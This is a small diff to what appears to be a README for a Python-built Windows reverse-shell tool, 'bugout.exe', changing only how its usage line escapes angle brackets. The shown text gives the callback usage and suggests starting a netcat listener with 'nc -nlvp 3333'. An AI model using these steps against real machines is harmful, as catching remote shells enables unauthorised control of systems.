@@ -3,7 +3,7 @@ fun with python, windows web shells, and trying to get more interactive callback
 <br>
 The python is here, feel free to steal, that's what I did.
 <br>
-USAGE:  bugout.exe <youripaddr> <yourportlistener>
+USAGE:  bugout.exe \<youripaddr\> \<yourportlistener\>
 <br>
 maybe setup a: nc -nlvp 3333 first or something.
 <br>
